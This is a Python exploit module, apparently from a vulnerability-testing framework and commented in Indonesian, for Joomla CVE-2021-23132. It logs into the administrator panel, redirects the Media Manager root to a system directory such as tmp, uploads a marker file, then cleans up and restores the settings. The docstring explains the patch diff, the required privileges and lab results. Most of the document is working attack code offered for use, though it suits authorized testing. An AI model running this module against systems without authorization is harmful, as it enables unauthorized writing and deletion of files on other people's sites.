#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2021-23132 — com_media menerima direktori yang TIDAK diperuntukkan bagi unggahan gambar
sebagai akar media (file_path/image_path), sehingga Media Manager dapat bekerja di dalam
direktori sistem (menulis, menghapus) di luar `images`.
Affected : Joomla! 3.0.0 - 3.9.24   |   Patched: 3.9.25
Advisory : JSST [20210201] Core - com_media allowed paths that are not intended for image uploads
NVD      : 7.5 · AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N  (PR:N TIDAK akurat — lihat "Batas aktor")

SUMBER (diverifikasi dari diff resmi 3.9.24 -> 3.9.25):

  libraries/src/Form/Rule/FilePathRule.php  — rule yang sama yang diperkenalkan patch 3.9.21
  (CVE-2020-24597). 3.9.25 menambahkan DUA pemeriksaan:

      + // nilai harus diawali huruf a-z/A-Z (tidak boleh '/' atau '.')
      + if (!preg_match("/^[A-Za-z]*$/", substr($value, 0, 1))) { return false; }
      +
      + // hormati atribut exclude pada XML field
      + $exclude = explode('|', (string) $element['exclude']);
      + $path    = explode('/', $value);
      + if (!empty($exclude) && (in_array(strtolower($path[0]), $exclude) || empty($path[0]))) { return false; }

  administrator/components/com_media/config.xml — atribut `exclude` baru pada field path:
      file_path : administrator|api|bin|cache|cli|components|includes|language|layouts|libraries|media|modules|plugins|templates|tmp
      image_path: administrator|api|bin|cache|cli|components|includes|language|layouts|libraries|modules|plugins|templates|tmp

  administrator/components/com_media/media.php — pengerasan tambahan:
      $mediaBaseDir = JPATH_ROOT . '/' . $params->get($path, 'images');
      if (!is_dir($mediaBaseDir)) { throw new \InvalidArgumentException(..., 404); }

  Jadi pada 3.9.21-3.9.24 nilai seperti `libraries`, `administrator`, `plugins`, `tmp` LOLOS rule
  (hanya traversal `../` yang ditolak), dan akar media berpindah ke direktori sistem itu.

BATAS AKTOR (jangan menulis "unauth" — NVD menandai PR:N, terbukti tidak akurat):
  * menyimpan opsi komponen: `core.admin` ATAU `core.options` pada com_media
    (administrator/components/com_config/controller/component/save.php)
  * mengunggah berkas: `core.create` pada com_media (Media Manager)
  * menghapus berkas: `core.delete` pada com_media
  Populasi nyata: Super User, dan situs yang mendelegasikan hak opsi/media ke grup lebih rendah.

DAMPAK (jujur — lapisan lanjut masih dibatasi konfigurasi):
  * Akar media = direktori sistem -> Media Manager dapat MENULIS berkas dengan ekstensi yang
    diizinkan (`upload_extensions`, bawaan non-eksekutif) dan MENGHAPUS berkas apa pun di dalam
    direktori itu (penghapusan tidak disaring ekstensi).
  * Eksekusi kode tidak otomatis: perlu whitelist unggahan diperluas + pemetaan eksekusi oleh
    server. Yang terbukti di sini = integritas/kerusakan (sesuai C:N/I:H dari NVD).
  * Tulis ke direktori sistem bergantung izin tulis user web terhadap direktori target
    (di lab: `tmp` writable -> tulis berhasil; `libraries` root-owned -> tulis gagal).

BUKTI LAB (2026-11-09): mp-j3924 @8170 (3.9.24) vs mp-j3925 @8171 (3.9.25), PHP 7.4 + MySQL 5.7,
`/tmp/prep_23132.sh` (hash bcrypt dibuat runtime + diverifikasi), akun labadmin (Super User).

  | target  | simpan image_path=tmp | simpan image_path=libraries | unggah penanda |
  | 3.9.24  | diterima (tanpa pesan) | diterima (tersimpan) | "Upload Complete: /tmp/mp23132marker.txt" -> berkas DI DALAM direktori sistem tmp (di luar images) |
  | 3.9.25  | DITOLAK: "Invalid field: Path to Files Folder" + "Path to Images Folder" | DITOLAK | berkas jatuh di /images/ (akar sah) |
  Setelah pembuktian: penanda dihapus via file.delete, nilai opsi dikembalikan ke `images` (terverifikasi di DB).
"""

import html
import random
import re
import string

import requests

from mp import (CveModule, ST_CLEAN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le, ST_INFO)

MANIFEST = "/administrator/manifests/files/joomla.xml"
FIXED = (3, 9, 25)
DEFAULT_TARGET = "tmp"        # ada di daftar exclude 3.9.25; di lab writable oleh www-data
_TAG = re.compile(r"<(input|select|textarea)\b([^>]*)>(.*?)(?:</\1>)?", re.S | re.I)


def _release(t, h):
    cached = getattr(t, "_j23132ver", None)
    if cached is not None:
        return cached
    val = (None, "")
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._j23132ver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _attr(attrs, name):
    m = re.search(name + r'\s*=\s*"([^"]*)"', attrs, re.I)
    return html.unescape(m.group(1)) if m else None


def _parse_form(page):
    out = {}
    for kind, attrs, inner in _TAG.findall(page or ""):
        n = _attr(attrs, "name")
        if not n or n in ("task", "option", "view"):
            continue
        kind = kind.lower()
        if kind == "input":
            typ = (_attr(attrs, "type") or "text").lower()
            val = _attr(attrs, "value") or ""
            if typ in ("checkbox", "radio"):
                if "checked" in attrs.lower():
                    out[n] = val if val else "1"
            elif typ != "submit":
                out[n] = val
        elif kind == "select":
            m = (re.search(r'<option[^>]*selected[^>]*value="([^"]*)"', inner, re.I)
                 or re.search(r'<option[^>]*value="([^"]*)"[^>]*selected', inner, re.I))
            out[n] = html.unescape(m.group(1)) if m else ""
        else:
            out[n] = html.unescape(inner.strip())
    return out


def _token(text):
    m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', text or "")
    return m.group(1) if m else None


def _messages(text):
    return [m.strip() for m in re.findall(r'alert-(?:message|error)[^>]*>\s*([^<]+)', text or "")]


def _login(base, user, password, timeout=25):
    s = requests.Session()
    t = _token(s.get(base + "/administrator/index.php", timeout=timeout).text)
    if not t:
        return None, "token login tidak ditemukan (bukan Joomla admin?)"
    r = s.post(base + "/administrator/index.php",
               data={"username": user, "passwd": password, "option": "com_login",
                     "task": "login", "return": "aW5kZXgucGhw", t: "1"}, timeout=timeout)
    if "logout" not in r.text.lower() and "com_cpanel" not in r.text.lower():
        return None, f"login gagal (http={r.status_code})"
    return s, "ok"


def _save(s, base, data, timeout=25):
    return s.post(base + "/administrator/index.php?option=com_config&task=config.save&component=com_media",
                  data=data, timeout=timeout, allow_redirects=True)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _release(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 9, 24)):
        return ST_CLEAN, f"Joomla {ver_s} — >= 3.9.25 (FilePathRule menolak path di daftar exclude)", \
                         f"version={ver_s}"
    return (ST_INFO,
            f"Joomla {ver_s} — FilePathRule belum memuat daftar exclude: `file_path`/`image_path` "
            f"dapat diarahkan ke direktori sistem (libraries/administrator/plugins/tmp/...) sehingga "
            f"Media Manager menulis & menghapus berkas di luar images "
            f"(butuh hak menyimpan opsi komponen — bukan unauth)",
            f"version={ver_s} | fixed=3.9.25")


def exploit(t, h, opts):
    ver, ver_s = _release(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 9, 24)):
        return ST_CLEAN, f"Joomla {ver_s} — >= 3.9.25 (exclude aktif di FilePathRule)", f"version={ver_s}"

    user = (getattr(opts, "username", None) or "").strip()
    password = getattr(opts, "password", None) or ""
    if not user or not password:
        return (ST_VULN,
                f"Joomla {ver_s} — akar media dapat diarahkan ke direktori sistem, tetapi modul perlu "
                f"akun dengan hak opsi komponen (core.admin/core.options com_media): --username/--password",
                f"version={ver_s} | kredensial tidak diberikan")

    target_dir = (getattr(opts, "category_ext", None) or "").strip() or DEFAULT_TARGET
    s, info = _login(t.url, user, password)
    if s is None:
        return ST_UNKNOWN, f"Joomla {ver_s} — {info}", f"version={ver_s}"

    page = s.get(t.url + "/administrator/index.php?option=com_config&view=component&component=com_media",
                 timeout=25)
    tok = _token(page.text)
    if not tok:
        return (ST_UNKNOWN,
                f"halaman opsi com_media tidak dapat dimuat (HTTP {page.status_code}) — akun tanpa hak opsi",
                f"version={ver_s}")
    data = _parse_form(page.text)
    orig = {k: data.get(k) for k in ("jform[image_path]", "jform[file_path]")}
    ev = f"version={ver_s} | aktor={user} | target={target_dir!r} | nilai_awal={orig}"

    data.update({"jform[image_path]": target_dir, "jform[file_path]": target_dir, tok: "1"})
    r = _save(s, t.url, data)
    msgs = _messages(r.text)
    ev += f" | save={r.status_code} pesan={[m for m in msgs if m][:2]}"
    if any("invalid field" in m.lower() for m in msgs):
        return (ST_CLEAN, f"nilai path ditolak validasi (3.9.25+): {[m for m in msgs if m][:2]}", ev)

    # bukti efek: unggah penanda -> pesan lokasi menunjukkan akar media yang baru
    marker = f"mp23132{_rand(8)}.txt"
    mtok = _token(s.get(t.url + "/administrator/index.php?option=com_media", timeout=25).text)
    up = s.post(t.url + "/administrator/index.php?option=com_media&task=file.upload&format=json&folder=",
                data={mtok: "1"} if mtok else {},
                files={"Filedata": (marker, b"MP23132-INTO-SYSTEM-DIR\n")}, timeout=25)
    try:
        j = up.json()
    except Exception:  # noqa: BLE001
        j = {}
    msg = str(j.get("message") or "")
    ev += f" | upload={up.status_code} pesan={msg[:64]!r}"
    moved = bool(re.search(r"Complete:\s*/" + re.escape(target_dir.strip("/")) + "/", msg))
    written = "complete" in msg.lower()

    # bersihkan penanda (butuh core.delete) lalu kembalikan opsi
    try:
        s.post(t.url + "/administrator/index.php?option=com_media&task=file.delete&folder=&tmpl=component",
               data={mtok: "1", "rm[]": marker}, timeout=25)
        ev += " | cleanup=file.delete"
    except Exception:  # noqa: BLE001
        ev += " | cleanup=gagal"
    restore = dict(data)
    for k, v in orig.items():
        if v is not None:
            restore[k] = v
    rb = _save(s, t.url, restore)
    ev += f" | restore={rb.status_code}"

    if moved and written:
        return (ST_VULN,
                f"akar Media Manager berpindah ke direktori sistem {target_dir!r}: penanda ditulis di "
                f"/{target_dir}/{marker} (di luar images) dan dapat dihapus dari sana -> Media Manager "
                f"beroperasi di direktori yang tidak diperuntukkan bagi unggahan (integritas). "
                f"Penanda dibersihkan & nilai opsi dikembalikan",
                ev)
    if moved:
        return (ST_VULN,
                f"opsi path menerima direktori sistem {target_dir!r} (tersimpan) dan Media Manager "
                f"memakai akar itu (pesan unggah {msg[:60]!r}); penulisan gagal karena izin direktori "
                f"target — dampak tetap: permukaan tulis/hapus Media Manager berada di direktori sistem",
                ev)
    return (ST_VULN,
            f"opsi path menerima direktori sistem {target_dir!r} tanpa validasi (tersimpan), namun efek "
            f"unggah tidak teramati pada akar baru (pesan {msg[:60]!r})",
            ev)


register(CveModule(
    cve="CVE-2021-23132",
    cluster="joomla_core",
    title="Joomla Core - com_media menerima direktori sistem sebagai akar media "
          "(file_path/image_path tanpa daftar exclude)",
    vclass="path traversal",
    cvss="7.5",
    severity="high",
    cwe="CWE-22",
    product="Joomla! Core (libraries/src/Form/Rule/FilePathRule.php + com_media)",
    versions_affected="3.0.0-3.9.24",
    status="verified",
    requires=[
        "akun dengan core.admin ATAU core.options pada com_media untuk menyimpan opsi; core.create "
        "untuk unggah; core.delete untuk menghapus — BUKAN unauth (NVD PR:N tidak akurat)",
        "direktori target harus writable oleh user web server agar penulisan terbukti "
        "(penghapusan juga bergantung izin direktori)",
        "--username/--password; --category-ext untuk direktori target lain (default 'tmp')",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Perbaikan 3.9.25 pada libraries/src/Form/Rule/FilePathRule.php menambahkan: (1) nilai wajib "
        "diawali huruf (menolak '/', '.'), (2) pertama string path tidak boleh ada di daftar exclude "
        "yang kini dideklarasikan di administrator/components/com_media/config.xml "
        "(file_path: administrator|bin|cache|cli|components|includes|language|layouts|libraries|media|"
        "modules|plugins|templates|tmp|api; image_path sama tanpa 'media'). Pengerasan tambahan: "
        "com_media/media.php menolak bila akar media bukan direktori (is_dir). Rule yang sama "
        "diperkenalkan patch 3.9.21 (CVE-2020-24597), jadi kedua CVE bersaudara: 24597 = traversal "
        "'../' ditolak, 23132 = path dalam-tree yang sensitif ditolak. Bukti lab 2026-11-09: "
        "3.9.24 @8170 menyimpan image_path=tmp lalu unggahan mendarat di /tmp/<marker>.txt "
        "(direktori sistem, di luar images) dan bisa dihapus dari sana; 3.9.25 @8171 menolak dengan "
        "'Invalid field: Path to Files Folder/Path to Images Folder'. Modul membersihkan penanda dan "
        "mengembalikan nilai opsi semula."
    ),
))
